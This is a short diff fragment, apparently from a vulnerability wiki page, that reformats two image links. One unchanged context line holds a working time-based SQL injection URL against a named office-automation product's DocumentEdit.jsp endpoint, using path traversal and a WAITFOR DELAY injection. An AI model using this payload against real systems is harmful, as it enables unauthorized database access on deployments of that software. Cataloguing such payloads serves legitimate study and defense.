@@ -24,4 +24,5 @@
 /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--
 ```
 
-![img](../../../.vuepress/public/img/1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a.png)![img](/assets/PeiQi-Wiki/img/1662358633067-36051816-df31-4886-b3cb-69fa17dd5872.png)
+![img](/assets/PeiQi-Wiki/img/1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a.png)
+![img](/assets/PeiQi-Wiki/img/1662358633067-36051816-df31-4886-b3cb-69fa17dd5872.png)
